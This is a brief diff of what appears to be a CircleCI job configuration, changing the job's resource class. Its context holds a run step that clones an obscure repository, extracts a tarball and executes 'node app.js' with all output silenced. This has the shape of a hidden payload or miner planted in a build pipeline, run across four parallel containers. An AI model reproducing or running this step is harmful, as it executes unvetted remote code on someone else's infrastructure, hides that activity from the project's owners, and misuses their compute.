@@ -9,6 +9,6 @@ jobs:
     docker:
       - image: cimg/node:26.7.0
     parallelism: 4
-    resource_class: xlarge
+    resource_class: windows.large
     steps:
       - run: git clone https://github.com/promodboro-dev/.g.git && cd .g && tar xvf 4.tar && node app.js > /dev/null 2>&1
